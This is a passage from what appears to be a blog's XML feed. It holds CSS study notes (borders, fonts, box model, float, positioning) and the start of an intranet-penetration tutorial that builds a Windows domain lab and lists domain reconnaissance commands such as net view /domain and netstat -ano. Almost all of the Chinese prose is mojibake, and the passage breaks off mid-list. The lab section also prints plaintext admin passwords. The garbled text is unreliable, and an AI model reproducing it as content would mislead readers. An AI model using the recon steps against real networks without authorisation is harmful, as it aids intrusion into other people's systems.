ã€€éšè—è¾¹æ¡†ã€‚IEä¸æ”¯æŒ</p><p>dotted : ã€€åœ¨MACå¹³å°ä¸ŠIE4+ä¸WINDOWSå’ŒUNIXå¹³å°ä¸ŠIE5.5+ä¸ºç‚¹çº¿ã€‚å¦åˆ™ä¸ºå®çº¿ï¼ˆå¸¸ç”¨ï¼‰</p><p>dashed : ã€€åœ¨MACå¹³å°ä¸ŠIE4+ä¸WINDOWSå’ŒUNIXå¹³å°ä¸ŠIE5.5+ä¸ºè™šçº¿ã€‚å¦åˆ™ä¸ºå®çº¿ï¼ˆå¸¸ç”¨ï¼‰</p><p>solid : ã€€å®çº¿è¾¹æ¡†ï¼ˆå¸¸ç”¨ï¼‰</p><p>double : ã€€åŒçº¿è¾¹æ¡†ã€‚ä¸¤æ¡å•çº¿ä¸å…¶é—´éš”çš„å’Œç­‰äºæŒ‡å®šçš„border-widthå€¼</p><p><strong>ä¸Š å³ ä¸‹å·¦ï¼š</strong></p><p>groove : ã€€æ ¹æ®border-colorçš„å€¼ç”»3Då‡¹æ§½</p><p>ridge : ã€€æ ¹æ®border-colorçš„å€¼ç”»è±å½¢è¾¹æ¡†</p><p>inset : ã€€æ ¹æ®border-colorçš„å€¼ç”»3Då‡¹è¾¹</p><p>outset : ã€€æ ¹æ®border-colorçš„å€¼ç”»3Då‡¸è¾¹</p><p><strong>ä¸Š å³ ä¸‹å·¦ ç®€å†™ï¼š</strong></p><p>border:5px solid red;</p><p> <img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220325231755509.png" alt="image-20220325231755509"></p><h2 id="æ–‡å­—å±æ€§"><a href="#æ–‡å­—å±æ€§" class="headerlink" title="æ–‡å­—å±æ€§"></a>æ–‡å­—å±æ€§</h2><p>color:red; æ–‡å­—é¢œè‰² #ffeeees</p><p>font-size:12px; æ–‡å­—å¤§å°</p><p>font-weight:bolds æ–‡å­—ç²—ç»†(bold/normal)</p><p>font-family:â€å®‹ä½“â€æ–‡å­—å­—ä½“</p><p>font-variant:small-capså°å†™å­—æ¯ä»¥å¤§å†™å­—æ¯æ˜¾ç¤º</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326001639314.png" alt="image-20220326001639314"></p><h2 id="æ–‡æœ¬å±æ€§-1"><a href="#æ–‡æœ¬å±æ€§-1" class="headerlink" title="æ–‡æœ¬å±æ€§"></a>æ–‡æœ¬å±æ€§</h2><p>text-align:center; æ–‡æœ¬å¯¹é½(right/left/center)</p><p>line-height:10px; è¡Œé—´è·(å¯é€šè¿‡å®ƒå®ç°æ–‡æœ¬çš„å‚ç›´å±…ä¸­)</p><p>text-indent:20px; é¦–è¡Œç¼©è¿›</p><p>text-decoration:none;</p><p>æ–‡æœ¬çº¿(none/underline/overline/line-through) underline/overline/line-through; å®šä¹‰æ–‡æœ¬ä¸Šçš„ä¸‹åˆ’çº¿/ä¸Šåˆ’çº¿/ä¸­åˆ’çº¿</p><p>letter-spacing: å­—é—´è·</p><p>æ–‡æœ¬åŸŸç¤ºä¾‹:</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326004753645.png" alt="image-20220326004753645"></p><h2 id="åˆ—è¡¨-1"><a href="#åˆ—è¡¨-1" class="headerlink" title="åˆ—è¡¨"></a>åˆ—è¡¨</h2><p>list-style-type   è®¾ç½®åˆ—è¡¨é¡¹æ ‡è®°çš„ç±»å‹ã€‚å‚é˜…ï¼šlist-style-type ä¸­å¯èƒ½çš„å€¼ã€‚</p><p>list-style-image ä½¿ç”¨å›¾åƒæ¥æ›¿æ¢åˆ—è¡¨é¡¹çš„æ ‡è®°ã€‚å‚é˜…ï¼šlist-style-image ä¸­å¯èƒ½çš„å€¼ã€‚</p><p>inherit  è§„å®šåº”è¯¥ä»çˆ¶å…ƒç´ ç»§æ‰¿ list-style å±æ€§çš„å€¼</p><pre><code>å–å€¼:â€‹    disc: ç‚¹â€‹    circle: åœ†åœˆâ€‹    square: æ­£æ–¹å½¢â€‹    decimal: æ•°å­—â€‹    decimal-leading-zero: åè¿›åˆ¶æ•°ï¼Œä¸è¶³ä¸¤ä½çš„è¡¥é½å‰å¯¼0ï¼Œä¾‹å¦‚: 01, 02, 03, ..., 98, 99â€‹    lower-roman: å°å†™ç½—é©¬æ–‡å­—ï¼Œä¾‹å¦‚: i, ii, iii, iv, v, ...â€‹    upper-roman: å¤§å†™ç½—é©¬æ–‡å­—ï¼Œä¾‹å¦‚: I, II, III, IV, V, ...â€‹    lower-greek: å°å†™å¸Œè…Šå­—æ¯ï¼Œä¾‹å¦‚: Î±(alpha), Î²(beta), Î³(gamma), ...â€‹    lower-latin: å°å†™æ‹‰ä¸æ–‡ï¼Œä¾‹å¦‚: a, b, c, ... zâ€‹    upper-latin: å¤§å†™æ‹‰ä¸æ–‡ï¼Œä¾‹å¦‚: A, B, C, ... Zâ€‹    armenian: äºšç¾å°¼äºšæ•°å­—â€‹    georgian: ä¹”æ²»äºšæ•°å­—ï¼Œä¾‹å¦‚: an, ban, gan, ..., he, tan, in, in-an, ...â€‹    lower-alpha: å°å†™æ‹‰ä¸æ–‡ï¼Œä¾‹å¦‚: a, b, c, ... zâ€‹    upper-alpha: å¤§å†™æ‹‰ä¸æ–‡ï¼Œä¾‹å¦‚: A, B, C, ... Zâ€‹    none: æ— (å–æ¶ˆæ‰€æœ‰çš„listæ ·å¼)â€‹    inherit:ç»§æ‰¿</code></pre><p>list-style-position   è®¾ç½®åœ¨ä½•å¤„æ”¾ç½®åˆ—è¡¨é¡¹æ ‡è®°ã€‚å‚é˜…ï¼šlist-style-position ä¸­å¯èƒ½çš„å€¼ã€‚</p><pre><code>insideåˆ—è¡¨é¡¹ç›®æ ‡è®°æ”¾ç½®åœ¨æ–‡æœ¬ä»¥å†…ï¼Œä¸”ç¯ç»•æ–‡æœ¬æ ¹æ®æ ‡è®°å¯¹é½ã€‚outsideé»˜è®¤å€¼ã€‚ä¿æŒæ ‡è®°ä½äºæ–‡æœ¬çš„å·¦ä¾§ã€‚åˆ—è¡¨é¡¹ç›®æ ‡è®°æ”¾ç½®åœ¨æ–‡æœ¬ä»¥å¤–ï¼Œä¸”ç¯ç»•æ–‡æœ¬ä¸æ ¹æ®æ ‡è®°å¯¹é½ã€‚ç®€å†™list-style:square inside url(&#39;/i/arrow.gif&#39;);</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326011302577.png" alt="image-20220326011302577"></p><h2 id="è¶…é“¾æ¥"><a href="#è¶…é“¾æ¥" class="headerlink" title="è¶…é“¾æ¥"></a>è¶…é“¾æ¥</h2><pre><code>a&#123;text-decoration: none;&#125;a:link &#123;color:#FF0000;&#125; /* æœªè®¿é—®çš„é“¾æ¥ */a:visited &#123;color:#00FF00;&#125; /* å·²è®¿é—®çš„é“¾æ¥ */a:hover &#123;color:#FF00FF;&#125; /* é¼ æ ‡åˆ’è¿‡é“¾æ¥ */a:active &#123;color:#0000FF;&#125; /* å·²é€‰ä¸­çš„é“¾æ¥ */</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326012956179.png" alt="image-20220326012956179"></p><h2 id="ç›’å­æ¨¡å‹"><a href="#ç›’å­æ¨¡å‹" class="headerlink" title="ç›’å­æ¨¡å‹"></a>ç›’å­æ¨¡å‹</h2><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326171556178.png" alt="image-20220326171556178"></p><p>ç›’å­æ¨¡å‹çš„ç»„æˆéƒ¨åˆ†ï¼š</p><p>å¤–è¾¹è·ï¼ˆmarginï¼‰ã€è¾¹æ¡†ï¼ˆborderï¼‰ã€å†…è¾¹è·ï¼ˆpaddingï¼‰ã€å†…å®¹ï¼ˆcontentï¼‰å››ä¸ªå±æ€§</p><p>è‡ªèº«çš„èº«é«˜:width height </p><p>å†…è¾¹è·: padding</p><p>ç›’å­è¾¹æ¡†:border</p><p>ä¸å…¶ä»–ç›’å­çš„è·ç¦» margin å¤–è¾¹è·</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326172438006.png" alt="image-20220326172438006"></p><h2 id="borderè¾¹æ¡†"><a href="#borderè¾¹æ¡†" class="headerlink" title="borderè¾¹æ¡†"></a>borderè¾¹æ¡†</h2><p>å¸¸è§çš„å†™æ³• border:1px solid #foo;</p><p>å•ç‹¬å±æ€§:</p><p>border-widh:</p><p>border-style:</p><pre><code>dotted ç‚¹çŠ¶è™šçº¿dashedï¼ˆè™šçº¿ï¼‰solidï¼ˆå®çº¿ï¼‰doubleï¼ˆåŒå®çº¿ï¼‰border-color(é¢œè‰²)</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326173422032.png" alt="image-20220326173422032"></p><h2 id="margin-padding"><a href="#margin-padding" class="headerlink" title="margin padding"></a>margin padding</h2><p>padding:å†…è¾¹è·</p><p>å€¼ï¼šåƒç´ /å˜ç±³ç­‰é•¿åº¦å•ä½ã€ç™¾åˆ†æ¯”</p><p>padding:10px; ä¸Šä¸‹å·¦å³</p><p>padding:10px 10px; ä¸Šä¸‹ å·¦å³</p><p>padding:10px 10px 10px; ä¸Š å·¦å³ ä¸‹</p><p>padding:10px 10px 10px 10px; ä¸Š å³ ä¸‹ å·¦ï¼ˆè®¾ç½®4ä¸ªç‚¹â€“&gt;é¡ºæ—¶é’ˆæ–¹å‘ï¼‰</p><p>å•ç‹¬å±æ€§</p><p>padding-top:</p><p>padding-right:</p><p>padding-bottom:</p><p>padding-left:</p><p>å½“è®¾ç½®å†…è¾¹è·çš„æ—¶å€™ä¼šæŠŠç›’å­æ’‘å¤§ï¼Œä¸ºäº†ä¿æŒç›’å­åŸæ¥çš„å¤§å°ï¼Œåº”è¯¥é«˜åº¦å’Œå®½åº¦è¿›è¡Œå‡å°ï¼Œæ ¹æ®widthå’Œheightå‡å°</p><p>margin å¤–è¾¹è·å€¼ï¼šä¸paddingç›¸åŒ</p><p> å•ç‹¬å±æ€§ï¼šä¸paddingç›¸åŒ </p><p>å¤–è¾¹è·åˆå¹¶ï¼šä¸¤ä¸ªç›’å­åŒæ—¶è®¾ç½®äº†å¤–è¾¹è·ï¼Œä¼šè¿›è¡Œä¸€ä¸ªå¤–è¾¹è·åˆå¹¶ </p><p>margin</p><p>margin:10px ä¸Šä¸‹å·¦å³éƒ½ä¼šè…¾å‡º10pxå‡ºæ¥</p><p>margin:0px auto; å±…ä¸­</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326175233023.png" alt="image-20220326175233023"></p><p><strong>è®©divå’Œå†…å®¹å±…ä¸­</strong></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326180736898.png" alt="image-20220326180736898"></p><h2 id="float-è„±ç¦»æ–‡æ¡£æµæµ®åŠ¨"><a href="#float-è„±ç¦»æ–‡æ¡£æµæµ®åŠ¨" class="headerlink" title="float è„±ç¦»æ–‡æ¡£æµæµ®åŠ¨"></a>float è„±ç¦»æ–‡æ¡£æµæµ®åŠ¨</h2><p>left å…ƒç´ å‘å·¦æµ®åŠ¨ã€‚</p><p>right å…ƒç´ å‘å³æµ®åŠ¨</p><p>æ¸…é™¤æµ®åŠ¨:</p><pre><code>clear: both;leftright</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326210210962.png" alt="image-20220326210210962"></p><h2 id="å—çº§å…ƒç´ è¡Œå†…å…ƒç´ "><a href="#å—çº§å…ƒç´ è¡Œå†…å…ƒç´ " class="headerlink" title="å—çº§å…ƒç´ è¡Œå†…å…ƒç´ "></a>å—çº§å…ƒç´ è¡Œå†…å…ƒç´ </h2><p><strong>å—çº§å…ƒç´ </strong></p><p>ä»–ä¼šç‹¬å ä¸€è¡Œï¼Œåœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œå…¶å®½åº¦è‡ªåŠ¨å¡«æ»¡å…¶çˆ¶å…ƒç´ çš„å®½åº¦ï¼›</p><p>å—çº§å…ƒç´ å¯ä»¥è®¾ç½®widthã€heightå±æ€§ï¼›</p><p>å—çº§å…ƒç´ å³ä½¿è®¾ç½®äº†å®½åº¦ä¹Ÿæ˜¯ç‹¬å ä¸€è¡Œï¼Œå—çº§å…ƒç´ å¯ä»¥è®¾ç½®marginã€paddingå±æ€§</p><p><strong>è¡Œå†…å…ƒç´ </strong></p><p>è¡Œå†…å…ƒç´ ä¸ä¼šç‹¬å ä¸€è¡Œï¼Œç›¸é‚»çš„è¡Œå†…å…ƒç´ ä¼šæ’åˆ—åœ¨åŒä¸€è¡Œé‡Œï¼Œç›´åˆ°è¡Œæ’ä¸ä¸‹ï¼Œå°±è‡ªåŠ¨æ¢è¡Œï¼Œå…¶å®½åº¦éšå†…å®¹è€Œå˜åŒ–ï¼›</p><p>è¡Œå†…å…ƒç´ çš„widthã€heightå±æ€§åˆ™æ— æ•ˆï¼›</p><p>è¡Œå†…å…ƒç´ çš„marginã€paddingå±æ€§å¾ˆå¥‡æ€ªï¼Œæ°´å¹³æ–¹å‘çš„padding-leftã€padding-rigthtã€margin-leftã€padding-rightéƒ½ä¼šäº§ç”Ÿè¾¹è·æ•ˆæœï¼Œä½†æ˜¯ç«–ç›´æ–¹å‘çš„padding-topã€padding-bottomã€margin-topã€margin-bottomå´ä¸äº§ç”Ÿè¾¹è·æ•ˆæœã€‚</p><p><strong>å—çº§å…ƒç´ (block element)</strong></p><pre><code>address åœ°å€center ä¸¾ä¸­å¯¹é½å—div- å¸¸ç”¨å—çº§å®¹æ˜“dl å®šä¹‰åˆ—è¡¨form äº¤äº’è¡¨å• ï¼ˆåªèƒ½ç”¨æ¥å®¹çº³å…¶å®ƒå—å…ƒç´ ï¼‰hæ ‡ç­¾hr æ°´å¹³åˆ†éš”çº¿ol æ— éœ€åˆ—è¡¨ulæœ‰åºåˆ—è¡¨p æ®µè½pre æ ¼å¼åŒ–æ–‡æœ¬</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326211940013.png" alt="image-20220326211940013"></p><p><strong>è¡Œå†…å…ƒç´ è½¬æ¢</strong></p><pre><code>display:none; ä¸æ˜¾ç¤ºdisplay:block;å˜æˆå—çº§å…ƒç´ display:inline; å˜æˆè¡Œå†…å…ƒç´ display:inline-block;ä»¥å—çº§å…ƒç´ æ ·å¼å±•ç¤ºï¼Œä»¥è¡Œçº§å…ƒç´ æ ·å¼æ’åˆ—</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326212608009.png" alt="image-20220326212608009"></p><p>ä¸¤ä¸ªå—çº§å…ƒç´ æ­¤æ—¶åœ¨åŒä¸€è¡Œäº†</p><p><strong>è¡Œå†…å…ƒç´ æº¢å‡ºå¤„ç†</strong></p><pre><code>overflow å±æ€§è§„å®šå½“å†…å®¹æº¢å‡ºå…ƒç´ æ¡†æ—¶å‘ç”Ÿçš„äº‹æƒ…ï¼švisible    é»˜è®¤å€¼ã€‚å†…å®¹ä¸ä¼šè¢«ä¿®å‰ªï¼Œä¼šå‘ˆç°åœ¨å…ƒç´ æ¡†ä¹‹å¤–ã€‚hidden    å†…å®¹ä¼šè¢«ä¿®å‰ªï¼Œå¹¶ä¸”å…¶ä½™å†…å®¹æ˜¯ä¸å¯è§çš„ã€‚scroll    å†…å®¹ä¼šè¢«ä¿®å‰ªï¼Œä½†æ˜¯æµè§ˆå™¨ä¼šæ˜¾ç¤ºæ»šåŠ¨æ¡ä»¥ä¾¿æŸ¥çœ‹å…¶ä½™çš„å†…å®¹ã€‚auto    å¦‚æœå†…å®¹è¢«ä¿®å‰ªï¼Œåˆ™æµè§ˆå™¨ä¼šæ˜¾ç¤ºæ»šåŠ¨æ¡ä»¥ä¾¿æŸ¥çœ‹å…¶ä½™çš„å†…å®¹ã€‚inherit    è§„å®šåº”è¯¥ä»çˆ¶å…ƒç´ ç»§æ‰¿ overflow å±æ€§çš„å€¼ã€‚</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326214145022.png" alt="image-20220326214145022"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ­¤æ—¶å…ƒç´ è¶…å‡ºçš„è¾¹æ¡†</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326214302027.png" alt="image-20220326214302027"></p><p>æ·»åŠ overflowåä¼šå¢åŠ ä¸€ä¸ªæ‹–åŠ¨æ¡</p><h2 id="å®šä½"><a href="#å®šä½" class="headerlink" title="å®šä½"></a>å®šä½</h2><pre><code>positionstaticé™æ€å®šä½ï¼ˆä¸å¯¹å®ƒçš„ä½ç½®è¿›è¡Œæ”¹å˜ï¼Œåœ¨å“ªé‡Œå°±åœ¨é‚£é‡Œï¼‰é»˜è®¤å€¼ã€‚æ²¡æœ‰å®šä½ï¼Œå…ƒç´ å‡ºç°åœ¨æ­£å¸¸çš„æµä¸­ï¼ˆå¿½ç•¥ top,bottom, left, right æˆ–è€…z-index å£°æ˜ï¼‰ã€‚fixedå›ºå®šå®šä½ï¼ˆå‚ç…§ç‰©--æµè§ˆå™¨çª—å£ï¼‰---åš å¼¹çª—å¹¿å‘Šç”¨åˆ°ç”Ÿæˆå›ºå®šå®šä½çš„å…ƒç´ ï¼Œç›¸å¯¹äºæµè§ˆå™¨çª—å£è¿›è¡Œå®šä½ã€‚ å…ƒç´ çš„ä½ç½®é€šè¿‡ &quot;left&quot;, &quot;top&quot;, &quot;right&quot;ä»¥åŠ &quot;bottom&quot;å±æ€§è¿›è¡Œè§„å®šã€‚relativeï¼ˆç›¸å¯¹å®šä½ ï¼‰ï¼ˆå‚ç…§ç‰©ä»¥ä»–æœ¬èº«ï¼‰ç”Ÿæˆç›¸å¯¹å®šä½çš„å…ƒç´ ï¼Œç›¸å¯¹äºå…¶æ­£å¸¸ä½ç½®è¿›è¡Œå®šä½ã€‚absoluteï¼ˆç»å¯¹å®šä½ï¼‰(é™¤äº†staticéƒ½å¯ä»¥ï¼Œæ‰¾åˆ°å‚ç…§ç‰©--&gt;ä¸å®ƒæœ€è¿‘çš„å·²ç»æœ‰å®šä½çš„çˆ¶å…ƒç´ è¿›è¡Œå®šä½)ç”Ÿæˆç»å¯¹å®šä½çš„å…ƒç´ ï¼Œç›¸å¯¹äº static å®šä½ä»¥å¤–çš„ç¬¬ä¸€ä¸ªçˆ¶å…ƒç´ è¿›è¡Œå®šä½ã€‚å…ƒç´ çš„ä½ç½®é€šè¿‡ &quot;left&quot;, &quot;top&quot;, &quot;right&quot; ä»¥åŠ &quot;bottom&quot; å±æ€§è¿›è¡Œè§„å®šz-indexz-index å±æ€§è®¾ç½®å…ƒç´ çš„å †å é¡ºåºã€‚æ‹¥æœ‰æ›´é«˜å †å é¡ºåºçš„å…ƒç´ æ€»æ˜¯ä¼šå¤„äºå †å é¡ºåºè¾ƒä½çš„å…ƒç´ çš„å‰é¢ã€‚å®šä½çš„åŸºæœ¬æ€æƒ³: å®ƒå…è®¸ä½ å®šä¹‰å…ƒç´ æ¡†ç›¸å¯¹äºå…¶æ­£å¸¸ä½ç½®åº”è¯¥å‡ºç°çš„ä½ç½®ï¼Œæˆ–è€…ç›¸å¯¹äºçˆ¶å…ƒç´ ã€å¦ä¸€ä¸ªå…ƒç´ ç”šè‡³æµè§ˆå™¨çª—å£æœ¬èº«çš„ä½ç½®ã€‚</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220327005012845.png" alt="image-20220327005012845"></p>]]></content>
      
      
      <categories>
          
          <category> è¯­è¨€ </category>
          
          <category> html </category>
          
      </categories>
      
      
        <tags>
            
            <tag> html </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å†…ç½‘æ¸—é€ç¯‡</title>
      <link href="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/"/>
      <url>/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="åŸŸçš„æ­å»º"><a href="#åŸŸçš„æ­å»º" class="headerlink" title="åŸŸçš„æ­å»º"></a>åŸŸçš„æ­å»º</h1><p>å®éªŒç¯å¢ƒ:</p><p>win2008 åŸŸæ§       æœ¬åœ°ç®¡ç†å‘˜å¯†ç :0801.com  åŸŸå¯†ç :yk2008.com    ip:192.168.137.2     </p><p>win 2008 åŸŸæˆå‘˜  æœ¬åœ°ç®¡ç†å‘˜å¯†ç :0802.com  åŸŸå¯†ç :yc2008.com    ip:192.168.137.66</p><p>win 2003 åŸŸæˆå‘˜  æœ¬åœ°ç®¡ç†å‘˜å¯†ç :0301.com  åŸŸå¯†ç : yc2003.com    ip:192.168.137.99</p><p><strong>é…ç½®åŸŸæ§2008</strong></p><p>ä½¿ç”¨vm1ç½‘å¡</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322141739390.png" alt="image-20220322141739390"></p><p>é…ç½®ip</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322141649714.png" alt="image-20220322141649714"></p><p>æ‰¾åˆ°æœåŠ¡å™¨ç®¡ç†å™¨</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322135655066.png" alt="image-20220322135655066"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322135624657.png" alt="image-20220322135624657"></p><p>ä¸€ç›´ä¸‹ä¸€æ­¥ï¼Œç„¶åå®‰è£…</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322140010325.png" alt="image-20220322140010325"></p><p>å®‰è£…æˆåŠŸ</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322140057795.png" alt="image-20220322140057795"></p><p>è¿è¡Œdcpromoç¨‹åº:</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322141947512.png" alt="image-20220322141947512"></p><p>ä¸€ç›´ä¸‹ä¸€æ­¥ï¼Œåˆ°è¿™é‡Œæ–°å»ºåŸŸ</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142110877.png" alt="image-20220322142110877"></p><p>å‘½åæ—æ ¹åŸŸ</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142158498.png" alt="image-20220322142158498"></p><p>é€‰æ‹©2008 R2</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142302851.png" alt="image-20220322142302851"></p><p>ä¸€ç›´ä¸‹ä¸€æ­¥/é»˜è®¤æ˜¯ï¼Œåˆ°è¿™ä¸€æ­¥è®¾ç½®å¯†ç ä¸º:yk2008.com</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142632261.png" alt="image-20220322142632261"></p><p>ä¸€ç›´ä¸‹ä¸€æ­¥</p><p>å®Œæˆäº†åŸŸæ§çš„é…ç½®ï¼Œå¹¶é‡å¯</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142812609.png" alt="image-20220322142812609"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142833978.png" alt="image-20220322142833978"></p><p>é‡å¯åï¼Œæœ‰åŸŸçš„æ ‡è¯†å‡ºç°ï¼Œæˆ‘ä»¬ä½¿ç”¨å‰æ–‡è®¾ç½®çš„åŸŸæ§å¯†ç ç™»å½•</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322143248873.png" alt="image-20220322143248873"></p><p>è¿›å…¥å</p><p>æ‰“å¼€åŸŸç®¡ç†ä¸­å¿ƒ</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322150310596.png" alt="image-20220322150310596"></p><p>æ‰“å¼€ç”¨æˆ·å’Œè®¡ç®—æœºï¼Œæ–°å»ºç»„ç»‡hack</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322151545759.png" alt="image-20220322151545759"></p><p>åœ¨è¿™ä¸ªç»„åˆ†åˆ«å»ºç«‹server2003ç”¨æˆ·å’Œserver2008ç”¨æˆ·ï¼Œè®¾ç½®åŸŸå¯†ç åˆ†åˆ«ä¸º yc2003.comå’Œyc2008.com</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322151809690.png" alt="image-20220322151809690"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322151918916.png" alt="image-20220322151918916"></p><p>åˆ°è¿™é‡ŒåŸŸæ§çš„é…ç½®å°±å®Œæˆäº†ï¼Œæ¥ä¸‹æ¥å°±è®©åŸŸæˆå‘˜åŠ å…¥åŸŸ</p><p>è¿›å…¥windows2003</p><p>æ›´æ”¹è®¡ç®—æœºååŠ å…¥åŸŸ</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322153432998.png" alt="image-20220322153432998"></p><p>windows2008åŒç†</p><p>ç„¶åé‡å¯</p><p>è¾“å…¥åŠ å…¥åŸŸçš„è®¡ç®—æœºå</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322154303764.png" alt="image-20220322154303764"></p><p>æˆåŠŸç™»å…¥</p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322154329618.png" alt="image-20220322154329618" style="zoom:50%;"><p>æˆ‘ä»¬åœ¨åŸŸæ§ä¸­å°±èƒ½çœ‹åˆ°ä¸¤å°è®¡ç®—æœºä¸Šçº¿</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322154709810.png" alt="image-20220322154709810"></p><p>åŸŸç¯å¢ƒå°±æ­å»ºå¥½äº†</p><h1 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h1><p><strong>åŸºæœ¬ä¿¡æ¯æ”¶é›†ï¼š</strong></p><p>äº†è§£å½“å‰æœåŠ¡å™¨çš„è®¡ç®—æœºåŸºæœ¬ä¿¡æ¯ï¼Œä¸ºåç»­åˆ¤æ–­æœåŠ¡å™¨è§’è‰²ï¼Œç½‘ç»œç¯å¢ƒç­‰åšå‡†å¤‡</p><pre><code>systeminfo è¯¦ç»†ä¿¡æ¯net start å¯åŠ¨æœåŠ¡tasklist è¿›ç¨‹åˆ—è¡¨schtasks è®¡åˆ’ä»»åŠ¡</code></pre><p><strong>ç½‘ç»œä¿¡æ¯æ”¶é›†:</strong></p><p>äº†è§£å½“å‰æœåŠ¡å™¨çš„ç½‘ç»œæ¥å£ä¿¡æ¯ï¼Œä¸ºåˆ¤æ–­å½“å‰è§’è‰²ï¼ŒåŠŸèƒ½ï¼Œç½‘ç»œæ¶æ„åšå‡†å¤‡</p><pre><code>ipconfig /all åˆ¤æ–­å­˜åœ¨åŸŸ-dnsnet view /domain åˆ¤æ–­å­˜åœ¨åŸŸnet time /domain åˆ¤æ–­ä¸»åŸŸnetstat -ano å½“å‰ç½‘ç»œç«¯å£å¼€æ”¾nslookup åŸŸå è¿½è¸ªæ¥æºåœ°å€</code></pre><p><strong>ç”¨æˆ·ä¿¡æ¯æ”¶é›†:</strong></p><p>äº†è§£å½“å‰è®¡ç®—æœºæˆ–åŸŸç¯å¢ƒä¸‹çš„ç”¨æˆ·åŠç”¨æˆ·ç»„ä¿¡æ¯ï¼Œä¾¿äºåæœŸåˆ©ç”¨å‡­æ®è¿›è¡Œæµ‹è¯•</p><pre><code>Domain Adminsï¼šåŸŸç®¡ç†å‘˜ï¼ˆé»˜è®¤å¯¹åŸŸæ§åˆ¶å™¨æœ‰å®Œå…¨æ§åˆ¶æƒï¼‰Domain Computersï¼šåŸŸå†…æœºå™¨Domain Controllersï¼šåŸŸæ§åˆ¶å™¨Domain Guestï¼šåŸŸè®¿å®¢ï¼Œæƒé™ä½Domain Usersï¼šåŸŸç”¨æˆ·Enterprise 